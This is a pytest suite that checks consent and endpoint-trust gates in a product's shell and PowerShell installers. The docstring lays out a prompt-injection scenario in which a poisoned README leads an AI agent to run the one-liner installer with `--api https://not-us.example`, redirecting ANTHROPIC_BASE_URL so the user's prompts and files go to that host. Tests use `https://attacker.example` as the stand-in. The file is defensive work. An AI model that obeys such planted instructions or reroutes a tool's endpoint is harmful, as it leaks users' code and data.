"""Consent, endpoint trust and abort-code behaviour of the two installers.

``tests/test_installer_validation.py`` covers what the installers will *accept*
as a value. This file covers something the value allow-list cannot reach: the
installers' published SHA256 pins the *script*, never the *command line*. A
genuine, byte-identical, hash-matching ``install.sh`` invoked as
``curl -fsSL https://yangble5.com/install.sh | sh -s -- --api https://not-us.example``
registers with that host, writes its key into ``~/.yangble5/credentials`` and
sets ``ANTHROPIC_BASE_URL`` to it -- after which every session started through
the launchers ships the user's prompts, file contents and diffs there. The
digest matches the whole time.

The landing page tells people to paste a one-liner into an AI agent, so the
attack needs no access to yangble5.com at all: it needs one poisoned README that
an agent reads and obeys. Hence the properties asserted here:

* a non-default endpoint is refused without explicit consent, and refused
  *before* anything is written;
* ``/auth/register`` -- which creates an account and consumes one of the
  endpoint's daily registration slots -- is refused without explicit consent;
* an abort reports an abort code, not the code that means "installed, add a key";
* both implementations agree on all of it.

Each test spells out the failure it is guarding, because a consent gate that
regresses fails open and silently.
"""

from __future__ import annotations

import json
import os
import platform
import shutil
import stat
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
INSTALL_SH = ROOT / "site" / "install.sh"
INSTALL_PS1 = ROOT / "site" / "install.ps1"

SH = shutil.which("dash") or shutil.which("sh")
POWERSHELL = shutil.which("powershell.exe") or shutil.which("powershell")

needs_sh = pytest.mark.skipif(SH is None, reason="POSIX sh not available")
needs_powershell = pytest.mark.skipif(
    POWERSHELL is None, reason="Windows PowerShell not available"
)

GOOD_KEY = "yb5_0123456789abcdef_AAAAAAAAAAAAAAAAAAAA"


# ==========================================================================
# a fake endpoint
#
# Routed by the FIRST path segment so one server can play every part: --api
# takes a path, so `--api http://127.0.0.1:PORT/ok` makes the installer call
# `/ok/auth/register`, `/ok/health` and so on.
# ==========================================================================
class _Handler(BaseHTTPRequestHandler):
    # HTTP/1.1, not the BaseHTTPRequestHandler default of 1.0. Every reply here
    # carries an accurate Content-Length, so keep-alive is honest -- and under
    # 1.0 the server closes the socket after each reply, which Windows
    # PowerShell's Invoke-WebRequest intermittently reported as "could not
    # reach the endpoint at all" against this loopback fixture.
    protocol_version = "HTTP/1.1"

    def _reply(self, code: int, obj: dict) -> None:
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("content-type", "application/json")
        self.send_header("content-length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _drain(self) -> None:
        """Consume the request body before replying.

        Not optional on a keep-alive connection: answering a POST without
        reading its body leaves those bytes in the socket, and the next request
        on the same connection starts parsing mid-JSON -- which surfaces as a
        501 on an unrelated later call, or as a reset the installer reports as
        "could not reach the endpoint at all".
        """
        try:
            length = int(self.headers.get("content-length") or 0)
        except ValueError:
            length = 0
        if length > 0:
            self.rfile.read(length)

    def _route(self) -> None:
        self._drain()
        parts = self.path.split("?")[0].strip("/").split("/")
        mode = parts[0] if parts else ""
        tail = "/" + "/".join(parts[1:])
        if tail == "/health":
            self._reply(200, {"status": "ok", "accepting_requests": True})
            return
        if tail == "/v1/models":
            self._reply(200, {"data": [{"id": "yangble5"}]})
            return
        if tail == "/v1/messages":
            self._reply(200, {"content": [{"type": "text", "text": "pong"}]})
            return
        if tail == "/auth/register":
            if mode == "ok":
                self._reply(201, {"api_key": GOOD_KEY, "key_id": "0123456789abcdef"})
            elif mode == "reused":
                self._reply(
                    200,
                    {
                        "api_key": GOOD_KEY,
                        "key_id": "0123456789abcdef",
                        "reused": True,
                        "warning": "This machine already had a key, so no new one was created.",
                    },
                )
            elif mode == "junk":
                self._reply(200, {"message": "here you go, friend"})
            elif mode == "busy":
                self._reply(429, {"type": "pool_full", "message": "the pool is full, sorry"})
            else:
                self._reply(500, {"message": "unknown mode"})
            return
        self._reply(404, {"message": "no such path"})

    do_GET = _route
    do_POST = _route

    def log_message(self, *_args) -> None:
        return  # keep the suite's output free of one access-log line per call


@pytest.fixture(scope="module")
def fake_api():
    """Base URL of a loopback endpoint. Append /ok, /reused, /junk or /busy."""
    # Threading, not the single-threaded HTTPServer: a run makes several
    # sequential calls and each installer opens a fresh connection, so a
    # serialised server turns an ordinary backlog into an intermittent
    # "could not reach the endpoint at all".
    server = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}"
    finally:
        server.shutdown()
        server.server_close()


# ==========================================================================
# harnesses
# ==========================================================================
IS_WINDOWS = platform.system() == "Windows"


def _write_shim(path: Path, body: str) -> None:
    path.write_text(body, newline="\n")
    path.chmod(path.stat().st_mode | stat.S_IEXEC)


@pytest.fixture(scope="session")
def sh_shim(tmp_path_factory) -> str:
    """A PATH prefix that makes install.sh runnable on a Windows dev box.

    install.sh is a macOS/Linux artefact and refuses outright under Git Bash --
    `uname -s` there says MINGW64_NT and the Windows binaries need install.ps1.
    That refusal is a feature and has its own test below. This fixture exists so
    that the REST of the POSIX behaviour can still be exercised locally, and it
    is a no-op on Linux CI, where the real uname and the real curl are used.

    Two shims, both Windows-only:

    * `uname`, which reports Linux;
    * `curl`, which rewrites the /tmp paths inside the generated curlrc to
      Windows form before delegating to the real curl.exe. MSYS converts
      path-shaped environment variables when a NATIVE process (pytest) launches
      an MSYS one (dash), so TMPDIR arrives as /tmp/... no matter what Python
      set -- and curl.exe cannot open an MSYS path. Only the file NAMES are
      touched; the request, the config contents and every code path in
      install.sh are the real ones.
    """
    if not IS_WINDOWS:
        return ""
    d = tmp_path_factory.mktemp("shim")
    _write_shim(
        d / "uname",
        "#!/bin/sh\n"
        'case "${1:-}" in\n'
        "  -s) echo Linux ;;\n"
        "  -m) echo x86_64 ;;\n"
        "  -n) echo testhost ;;\n"
        "  *)  echo Linux ;;\n"
        "esac\n",
    )
    real_curl = shutil.which("curl")
    if real_curl:
        _write_shim(
            d / "curl",
            "#!/bin/sh\n"
            f'REAL="{real_curl}"\n'
            'TMPWIN="$(cygpath -m /tmp)"\n'
            'if [ "${1:-}" = "--config" ] && [ -f "${2:-}" ]; then\n'
            '    cfg="$2"; shift 2\n'
            '    sed "s#/tmp/#${TMPWIN}/#g" "$cfg" > "${cfg}.win"\n'
            '    exec "$REAL" --config "$(cygpath -m "${cfg}.win")" "$@"\n'
            "fi\n"
            'exec "$REAL" "$@"\n',
        )
    return str(d)


def sh_run(
    home: Path, args: list[str], shim: str = "", extra_env: dict | None = None
) -> subprocess.CompletedProcess:
    """Run the real install.sh with stdin closed -- the `curl | sh` shape.

    stdin is DEVNULL on purpose: that is what makes `[ -t 0 ]` false, which is
    the exact condition under which the advertised one-liner runs and under
    which no prompt can reach a human.
    """
    assert SH is not None
    env = dict(os.environ)
    # Forward slashes: MSYS sh and Windows curl.exe both understand C:/a/b,
    # while a backslash is an escape to the former and mktemp would embed it.
    home_arg = str(home).replace("\\", "/")
    env.update({"HOME": home_arg, "NO_COLOR": "1"})
    # Windows curl.exe cannot open an MSYS /tmp path, and install.sh hands curl
    # a config file whose name comes from mktemp -d. Pointing TMPDIR at the
    # (Windows-shaped) pytest tmp dir keeps every path readable by both.
    env["TMPDIR"] = home_arg
    env.pop("YB5_SOURCE_ONLY", None)
    for name in ("YANGBLE5_API", "YANGBLE5_API_KEY", "YANGBLE5_EMAIL", "YANGBLE5_INVITE"):
        env.pop(name, None)
    if shim:
        env["PATH"] = shim + os.pathsep + env["PATH"]
    if extra_env:
        env.update(extra_env)
    return subprocess.run(  # noqa: S603 - fixed argv, interpreter from shutil.which
        [SH, str(INSTALL_SH), *args],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        env=env,
        stdin=subprocess.DEVNULL,
        timeout=180,
    )


def ps_run(profile: Path, args: list[str]) -> subprocess.CompletedProcess:
    assert POWERSHELL is not None
    env = dict(os.environ)
    env["USERPROFILE"] = str(profile)
    for name in ("YANGBLE5_API", "YANGBLE5_API_KEY", "YANGBLE5_EMAIL", "YANGBLE5_INVITE"):
        env.pop(name, None)
    return subprocess.run(  # noqa: S603 - fixed argv, interpreter from shutil.which
        [
            POWERSHELL,
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-File",
            str(INSTALL_PS1),
            *args,
        ],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        env=env,
        stdin=subprocess.DEVNULL,
        timeout=300,
    )


def installed_paths(home: Path) -> list[str]:
    """Everything the installer created, minus the local salt.

    machine-id is excluded because it is written before the registration call
    and is not part of "an install exists": it is a random number in a file.
    """
    root = home / ".yangble5"
    if not root.exists():
        return []
    return sorted(
        str(p.relative_to(root)) for p in root.rglob("*") if p.name != "machine-id"
    )


# ==========================================================================
# 1. a non-default endpoint is a privileged choice
# ==========================================================================
@needs_sh
def test_sh_refuses_a_nondefault_endpoint_with_no_terminal(tmp_path, sh_shim):
    """`... | sh -s -- --api https://attacker.tld` used to be accepted silently.

    The URL passed the shape check at input time and the https:// check in
    preflight, and nothing anywhere distinguished it from the default. Regressing
    this test means a poisoned one-liner installs a working exfiltration path.
    """
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(home, ["--api", "https://attacker.example", "--dry-run"], sh_shim)
    out = proc.stdout + proc.stderr
    assert proc.returncode == 1, out
    assert "attacker.example" in out
    assert "--allow-nondefault-endpoint" in out
    # It must name what the host receives, not just that it is unusual.
    assert "ANTHROPIC_BASE_URL" in out
    # Refused before the filesystem was touched at all.
    assert installed_paths(home) == []
    assert not (home / ".yangble5").exists()


@needs_sh
def test_sh_nondefault_endpoint_banner_precedes_any_promise(tmp_path, sh_shim):
    """The refusal must not come after a banner that already said what it would do."""
    home = tmp_path / "home"
    home.mkdir()
    out = sh_run(home, ["--api", "https://attacker.example", "--dry-run"], sh_shim).stdout
    assert "Installs to" not in out, "the banner ran before the endpoint was agreed"


@needs_sh
def test_sh_accepts_a_nondefault_endpoint_when_consent_is_explicit(tmp_path, sh_shim):
    """The gate has to be passable, or the documented local BYOK path is dead."""
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(
        home,
        ["--api", "http://127.0.0.1:8320", "--allow-nondefault-endpoint", "--dry-run"],
        sh_shim,
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "--allow-nondefault-endpoint was passed" in out


@needs_sh
def test_sh_default_endpoint_needs_no_endpoint_consent(tmp_path, sh_shim):
    """The canonical command must stay one flag long, not two."""
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(home, ["--yes-register", "--dry-run"], sh_shim)
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "NOT yangble5.com" not in out


@needs_powershell
def test_ps_refuses_a_nondefault_endpoint_with_no_console(tmp_path):
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(profile, ["-Api", "https://attacker.example", "-DryRun"])
    out = proc.stdout + proc.stderr
    assert proc.returncode == 1, out
    assert "attacker.example" in out
    assert "-AllowNonDefaultEndpoint" in out
    assert "ANTHROPIC_BASE_URL" in out
    assert not (profile / ".yangble5").exists()


@needs_powershell
def test_ps_accepts_a_nondefault_endpoint_when_consent_is_explicit(tmp_path):
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(
        profile, ["-Api", "http://127.0.0.1:8320", "-AllowNonDefaultEndpoint", "-DryRun"]
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "-AllowNonDefaultEndpoint was passed" in out


# ==========================================================================
# 2. registration is account creation, so it asks first
# ==========================================================================
@needs_sh
def test_sh_refuses_to_register_with_no_terminal_and_no_flag(tmp_path, sh_shim):
    """There used to be no consent step anywhere in the install path.

    The only `read` in install.sh was inside the here-doc that writes the
    *uninstaller*. So an agent handed "set up yangble5" created an account,
    minted a credential and wrote it to disk with nobody having said yes.
    """
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(home, ["--no-bin-link"], sh_shim)
    out = proc.stdout + proc.stderr
    assert proc.returncode == 1, out
    assert "--yes-register" in out
    # It must say what would be created, not merely that it refused.
    assert "/auth/register" in out
    assert "registrations-per-day" in out
    assert installed_paths(home) == []


@needs_sh
def test_sh_registers_when_the_flag_is_present(tmp_path, sh_shim, fake_api):
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(
        home,
        [
            "--api",
            fake_api + "/ok",
            "--allow-nondefault-endpoint",
            "--yes-register",
            "--no-bin-link",
        ],
        sh_shim,
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "registered" in out
    assert "credentials" in installed_paths(home)
    assert GOOD_KEY.encode() in (home / ".yangble5" / "credentials").read_bytes()


@needs_sh
def test_sh_byok_key_needs_no_registration_consent(tmp_path, sh_shim, fake_api):
    """Supplying a key registers nothing, so it must not be gated."""
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(
        home,
        [
            "--api",
            fake_api + "/junk",
            "--allow-nondefault-endpoint",
            "--no-bin-link",
        ],
        sh_shim,
        extra_env={"YANGBLE5_API_KEY": GOOD_KEY},
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "no registration needed" in out
    # The banner still explains the flag; what must not appear is the refusal.
    assert "REFUSED" not in out
    assert "This next step creates an account" not in out


@needs_powershell
def test_ps_refuses_to_register_with_no_console_and_no_switch(tmp_path):
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(profile, [])
    out = proc.stdout + proc.stderr
    assert proc.returncode == 1, out
    assert "-YesRegister" in out
    assert "/auth/register" in out
    assert not (profile / ".yangble5").exists()


@needs_powershell
def test_ps_registers_when_the_switch_is_present(tmp_path, fake_api):
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(
        profile,
        ["-Api", fake_api + "/ok", "-AllowNonDefaultEndpoint", "-YesRegister", "-NoLiveTest"],
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "registered" in out
    assert GOOD_KEY.encode() in (profile / ".yangble5" / "credentials").read_bytes()


# ==========================================================================
# 3. an abort must not report the code that means "installed"
# ==========================================================================
@needs_sh
def test_sh_unusable_register_reply_exits_9_not_6(tmp_path, sh_shim, fake_api):
    """6 used to be emitted for two disjoint outcomes.

    The documented one is the BYOK fall-through, which happens after
    write_config and leaves a complete install on disk. The other was this
    abort, which happens before write_config and leaves nothing -- reported
    with the code that tells the reader "installed, just add a key".
    """
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(
        home,
        [
            "--api",
            fake_api + "/junk",
            "--allow-nondefault-endpoint",
            "--yes-register",
            "--no-bin-link",
        ],
        sh_shim,
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 9, out
    # And the claim the code makes has to be true.
    assert installed_paths(home) == [], "exit 9 promised nothing was installed"


@needs_sh
def test_sh_byok_fallthrough_still_exits_6_with_a_real_install(tmp_path, sh_shim, fake_api):
    """The mirror: 6 must keep meaning "a complete install, only the key is missing"."""
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(
        home,
        [
            "--api",
            fake_api + "/busy",
            "--allow-nondefault-endpoint",
            "--yes-register",
            "--no-bin-link",
        ],
        sh_shim,
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 6, out
    present = installed_paths(home)
    for expected in ("credentials", "env.sh", "uninstall.sh"):
        assert expected in present, f"exit 6 promised an install; {expected} is missing"


@needs_powershell
def test_ps_unusable_register_reply_exits_9_not_6(tmp_path, fake_api):
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(
        profile,
        [
            "-Api",
            fake_api + "/junk",
            "-AllowNonDefaultEndpoint",
            "-YesRegister",
        ],
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 9, out
    assert installed_paths(profile) == []


@pytest.mark.parametrize("path", [INSTALL_SH, INSTALL_PS1])
def test_both_headers_document_exit_9(path):
    text = path.read_text(encoding="utf-8")
    assert "#   9  " in text, f"{path.name} uses exit 9 but its EXIT CODES table omits it"


# ==========================================================================
# 4. the server's own explanation has to survive to the screen
# ==========================================================================
@needs_powershell
def test_ps_shows_the_body_of_a_non_2xx_reply(tmp_path, fake_api):
    """Windows PowerShell 5.1 reads the error stream to EOF before throwing.

    Invoke-Yb5Request's catch then called GetResponseStream() + ReadToEnd(),
    which returned zero bytes from an already-exhausted stream, and the inner
    `catch { '' }` made that indistinguishable from "no body". Result: every
    non-2xx reply lost the server's message on Windows while curl showed it on
    Unix. The body is on $_.ErrorDetails.Message, which was never read.
    """
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(
        profile,
        [
            "-Api",
            fake_api + "/busy",
            "-AllowNonDefaultEndpoint",
            "-YesRegister",
            "-NoLiveTest",
        ],
    )
    out = proc.stdout + proc.stderr
    assert "the pool is full, sorry" in out, out
    # The `type` field travels the same path and is what names the refusal.
    assert "pool_full" in out


@needs_sh
def test_sh_shows_the_body_of_a_non_2xx_reply(tmp_path, sh_shim, fake_api):
    """The POSIX half of the same property, so the two cannot drift."""
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(
        home,
        [
            "--api",
            fake_api + "/busy",
            "--allow-nondefault-endpoint",
            "--yes-register",
            "--no-bin-link",
        ],
        sh_shim,
    )
    out = proc.stdout + proc.stderr
    assert "the pool is full, sorry" in out
    assert "pool_full" in out


# ==========================================================================
# 5. the endpoint travels with the key it belongs to
# ==========================================================================
@needs_sh
def test_sh_rerun_keeps_the_stored_endpoint(tmp_path, sh_shim, fake_api):
    """The key was read back from disk while the endpoint was re-derived.

    So `sh install.sh` on a machine installed against a local gateway rewrote
    base_url and ANTHROPIC_BASE_URL to https://yangble5.com while keeping a key
    that host never issued -- a config that authenticates nowhere, produced by
    the command the installer itself calls idempotent.
    """
    home = tmp_path / "home"
    home.mkdir()
    local = fake_api + "/ok"
    first = sh_run(
        home,
        ["--api", local, "--allow-nondefault-endpoint", "--yes-register", "--no-bin-link"],
        sh_shim,
    )
    assert first.returncode == 0, first.stdout + first.stderr

    second = sh_run(home, ["--no-bin-link"], sh_shim)
    out = second.stdout + second.stderr
    assert second.returncode == 0, out
    creds = (home / ".yangble5" / "credentials").read_bytes()
    assert f"YANGBLE5_API={local}\n".encode() in creds, "the stored endpoint was replaced"
    assert b"https://yangble5.com" not in creds


@needs_sh
def test_sh_refuses_a_conflicting_explicit_endpoint(tmp_path, sh_shim, fake_api):
    home = tmp_path / "home"
    home.mkdir()
    local = fake_api + "/ok"
    sh_run(
        home,
        ["--api", local, "--allow-nondefault-endpoint", "--yes-register", "--no-bin-link"],
        sh_shim,
    )
    proc = sh_run(home, ["--api", "https://yangble5.com", "--no-bin-link"], sh_shim)
    out = proc.stdout + proc.stderr
    assert proc.returncode == 1, out
    assert "--force-register" in out
    creds = (home / ".yangble5" / "credentials").read_bytes()
    assert f"YANGBLE5_API={local}\n".encode() in creds


@needs_powershell
def test_ps_rerun_keeps_the_stored_endpoint(tmp_path, fake_api):
    profile = tmp_path / "profile"
    profile.mkdir()
    local = fake_api + "/ok"
    first = ps_run(
        profile,
        ["-Api", local, "-AllowNonDefaultEndpoint", "-YesRegister", "-NoLiveTest"],
    )
    assert first.returncode == 0, first.stdout + first.stderr
    second = ps_run(profile, ["-NoLiveTest"])
    assert second.returncode == 0, second.stdout + second.stderr
    creds = (profile / ".yangble5" / "credentials").read_bytes()
    assert f"YANGBLE5_API={local}\n".encode() in creds
    assert b"https://yangble5.com" not in creds


# ==========================================================================
# 6. --reinstall must not become a second machine
# ==========================================================================
@needs_sh
def test_sh_reinstall_preserves_the_machine_salt(tmp_path, sh_shim, fake_api):
    """`rm -rf ~/.yangble5` deleted the salt the fingerprint is built from.

    With a new salt the gateway finds no binding, so it mints a genuinely
    SECOND key with a second daily allowance and burns one of the network's
    registrations for the day -- while both scripts told the reader that only
    --force-register could produce a new key.
    """
    home = tmp_path / "home"
    home.mkdir()
    args = [
        "--api",
        fake_api + "/ok",
        "--allow-nondefault-endpoint",
        "--yes-register",
        "--no-bin-link",
    ]
    assert sh_run(home, args, sh_shim).returncode == 0
    salt_file = home / ".yangble5" / "machine-id"
    before = salt_file.read_bytes()

    proc = sh_run(home, [*args, "--reinstall"], sh_shim)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert salt_file.read_bytes() == before, (
        "--reinstall changed this machine's identity"
    )


@needs_powershell
def test_ps_reinstall_preserves_the_machine_salt(tmp_path, fake_api):
    profile = tmp_path / "profile"
    profile.mkdir()
    args = [
        "-Api",
        fake_api + "/ok",
        "-AllowNonDefaultEndpoint",
        "-YesRegister",
        "-NoLiveTest",
    ]
    assert ps_run(profile, args).returncode == 0
    salt_file = profile / ".yangble5" / "machine-id"
    before = salt_file.read_bytes()
    proc = ps_run(profile, [*args, "-Reinstall"])
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert salt_file.read_bytes() == before


@needs_sh
def test_sh_reports_a_reissue_as_a_reissue(tmp_path, sh_shim, fake_api):
    """A 200 with "reused": true is not a registration.

    Neither installer read `reused` or `warning`, so the same key coming back
    with a fresh secret was announced as "registered", and --force-register
    looked like it had created a new account with a new allowance.
    """
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(
        home,
        [
            "--api",
            fake_api + "/reused",
            "--allow-nondefault-endpoint",
            "--yes-register",
            "--no-bin-link",
        ],
        sh_shim,
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "re-issued" in out
    assert "same key_id" in out
    assert "already had a key" in out, "the server's own warning was dropped"


@needs_powershell
def test_ps_reports_a_reissue_as_a_reissue(tmp_path, fake_api):
    profile = tmp_path / "profile"
    profile.mkdir()
    proc = ps_run(
        profile,
        [
            "-Api",
            fake_api + "/reused",
            "-AllowNonDefaultEndpoint",
            "-YesRegister",
            "-NoLiveTest",
        ],
    )
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert "re-issued" in out
    assert "already had a key" in out


# ==========================================================================
# 7. --show-key does what --help says it does
# ==========================================================================
@needs_sh
def test_sh_show_key_works_on_a_rerun(tmp_path, sh_shim, fake_api):
    """print_key_once returned early unless MODE was "registered".

    A re-run sets MODE=reused, so --show-key printed nothing at all -- and
    because the early return sat above both branches, the "your key was NOT
    printed, read it here" block was silent too.
    """
    home = tmp_path / "home"
    home.mkdir()
    args = [
        "--api",
        fake_api + "/ok",
        "--allow-nondefault-endpoint",
        "--yes-register",
        "--no-bin-link",
    ]
    assert sh_run(home, args, sh_shim).returncode == 0
    proc = sh_run(home, ["--no-bin-link", "--show-key"], sh_shim)
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert GOOD_KEY in out, "--show-key printed nothing on a re-used key"


@needs_powershell
def test_ps_show_key_works_on_a_rerun(tmp_path, fake_api):
    profile = tmp_path / "profile"
    profile.mkdir()
    args = [
        "-Api",
        fake_api + "/ok",
        "-AllowNonDefaultEndpoint",
        "-YesRegister",
        "-NoLiveTest",
    ]
    assert ps_run(profile, args).returncode == 0
    proc = ps_run(profile, ["-NoLiveTest", "-ShowKey"])
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out
    assert GOOD_KEY in out


# ==========================================================================
# 8. flags that take a value must not die on `shift`
# ==========================================================================
@needs_sh
@pytest.mark.parametrize("flag", ["--api", "--model", "--email", "--invite"])
def test_sh_value_flag_without_a_value_reports_usage(tmp_path, sh_shim, flag):
    """`shift` is a POSIX SPECIAL built-in.

    `shift 2` with one argument left does not merely fail: in dash it
    TERMINATES the shell with status 2 -- the code this script's own header
    reserves for "refused: running as root". --email and --invite omitted the
    guard that --api and --model had.
    """
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(home, [flag], sh_shim)
    out = proc.stdout + proc.stderr
    assert proc.returncode == 1, f"{flag} exited {proc.returncode}: {out}"
    assert "needs" in out
    assert "shift" not in out


# ==========================================================================
# 9. the Git Bash refusal has to hand back a command
# ==========================================================================
@needs_sh
def test_sh_mingw_refusal_gives_a_runnable_command(tmp_path, tmp_path_factory):
    """uname -s under Git Bash returns MINGW64_NT-..., which used to fall into
    the catch-all and print a prose sentence naming install.ps1 -- from inside
    a shell that cannot execute a .ps1 file. Every other refusal in the script
    ends in something you can paste."""
    shim = tmp_path_factory.mktemp("mingw")
    fake = shim / "uname"
    fake.write_text(
        "#!/bin/sh\n"
        'case "${1:-}" in\n'
        "  -s) echo MINGW64_NT-10.0-26100 ;;\n"
        "  -m) echo x86_64 ;;\n"
        "  -n) echo testhost ;;\n"
        "  *)  echo MINGW64_NT-10.0-26100 ;;\n"
        "esac\n",
        newline="\n",
    )
    fake.chmod(fake.stat().st_mode | stat.S_IEXEC)
    home = tmp_path / "home"
    home.mkdir()
    proc = sh_run(home, ["--dry-run"], str(shim))
    out = proc.stdout + proc.stderr
    assert proc.returncode == 4, out
    # It must recognise WHICH Windows shell this is, not just fall into the
    # generic "unsupported platform" arm -- that arm cannot know that WSL is
    # the alternative, or that this shell can invoke powershell.exe directly.
    assert "Git Bash" in out, "the MINGW case is gone; this fell through to the catch-all"
    assert "wsl" in out
    assert "powershell.exe" in out
    assert "install.ps1" in out
    # And it must fire before the banner promised anything.
    assert "Installs to" not in out


# ==========================================================================
# 10. the script must not publish a claim about a live deployment's mode
# ==========================================================================
def test_install_sh_does_not_assert_yangble5_com_has_no_registration():
    """install.sh's own header tells an AI agent to read this file to the human
    and the landing page tells users to `less install.sh`, so its comments are
    user-facing documentation. Asserting "and the current state of
    yangble5.com" inside a file SERVED BY yangble5.com encodes a setting that
    an operator can change, and it steered readers into the BYOK interview
    instead of the registration one."""
    text = INSTALL_SH.read_text(encoding="utf-8")
    assert "current state of yangble5.com" not in text
    for line in text.splitlines():
        stripped = line.strip()
        if not stripped.startswith("#"):
            continue
        low = stripped.lower()
        if "yangble5.com" in low and "does not" in low and "regist" in low:
            pytest.fail(f"a comment claims yangble5.com offers no registration: {stripped}")


# ==========================================================================
# 11. the Windows uninstaller removes everything the installer created
# ==========================================================================
def test_embedded_ps_uninstaller_removes_the_path_entry():
    """-AddToPath writes a per-user PATH entry, a registry change and the one
    thing install.ps1 creates outside .yangble5. The uninstaller it embeds used
    to say outright that it would not remove it, while the header promised an
    uninstaller that "removes everything it created"."""
    text = INSTALL_PS1.read_text(encoding="utf-8")
    assert "it will not remove the per-user PATH entry" not in text
    start = text.index("function Write-Uninstaller")
    end = text.index("# DELIBERATELY NO yangble5-uninstall.cmd", start)
    embedded = text[start:end]
    assert "SetEnvironmentVariable('Path'" in embedded, (
        "the embedded uninstaller never writes the per-user PATH back"
    )
    assert "removed PATH entry" in embedded


# ==========================================================================
# 12. the two implementations expose the same consent surface
# ==========================================================================
def test_both_installers_expose_the_same_consent_flags():
    """A gate that exists on one platform and not the other is not a gate."""
    sh_text = INSTALL_SH.read_text(encoding="utf-8")
    ps_text = INSTALL_PS1.read_text(encoding="utf-8")
    assert "--yes-register" in sh_text
    assert "--allow-nondefault-endpoint" in sh_text
    assert "$YesRegister" in ps_text
    assert "$AllowNonDefaultEndpoint" in ps_text
    # Both must reserve 9 for an abort and keep 6 for the BYOK-empty install.
    assert "EX_UPSTREAM=9" in sh_text
    assert "$EX_UPSTREAM = 9" in ps_text


# ── the machine id is a bearer credential, so it must not reach a transcript ──

def test_neither_installer_prints_the_full_machine_id():
    """The machine id must be truncated wherever it is shown.

    This is not a privacy nicety. `POST /auth/register` accepts a bare
    machine_id with no other authentication and returns the account's
    plaintext api_key -- verified against the live gateway on 2026-07-22: a
    second call carrying only the same machine_id came back `reused: true`
    with a working key. The full value is therefore a bearer credential.

    Both installers already refuse to print the api_key by default, and
    install.sh says why in its own header: "stdout here is an AI agent's
    transcript as often as it is a human's scrollback. A secret printed there
    has been disclosed to whatever that transcript is later sent to." The
    machine id had been exempt from that reasoning while being equivalent to
    the secret it protects.
    """
    problems = []

    for path, pattern in (
        (INSTALL_SH, '"machine id ${FINGERPRINT}"'),
        (INSTALL_PS1, '"machine id $fingerprint"'),
    ):
        src = path.read_text(encoding="utf-8")
        if pattern in src:
            problems.append(f"{path.name}: prints the whole machine id: {pattern}")

    # The truncation itself, so removing the guard without removing the print
    # cannot pass either.
    sh = INSTALL_SH.read_text(encoding="utf-8")
    ps1 = INSTALL_PS1.read_text(encoding="utf-8")
    if "cut -c1-12" not in sh:
        problems.append("install.sh: no 12-character truncation of the machine id")
    if "Substring(0, 12)" not in ps1:
        problems.append("install.ps1: no 12-character truncation of the machine id")

    assert problems == [], "\n".join(problems)
